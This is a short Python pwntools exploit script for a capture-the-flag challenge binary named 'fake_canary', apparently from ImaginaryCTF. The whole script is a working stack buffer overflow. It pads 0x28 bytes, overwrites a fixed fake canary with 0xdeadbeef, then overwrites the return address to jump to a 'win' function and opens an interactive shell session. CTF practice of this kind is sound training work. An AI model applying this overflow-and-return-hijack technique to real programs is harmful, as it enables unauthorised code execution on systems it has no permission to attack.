from pwn import *
#h,p = 'chal.imaginaryctf.org', 42002
#p = remote(h,p)
p = process("./fake_canary")
#gdb.attach("fake_canary")
win = 0x400725
exp = "A"*0x28+ p64(3735928559)+p64(1)+ p64(0x000000000400729)
#exp = "AAAAAAAA"
p.sendline(exp)
p.interactive()
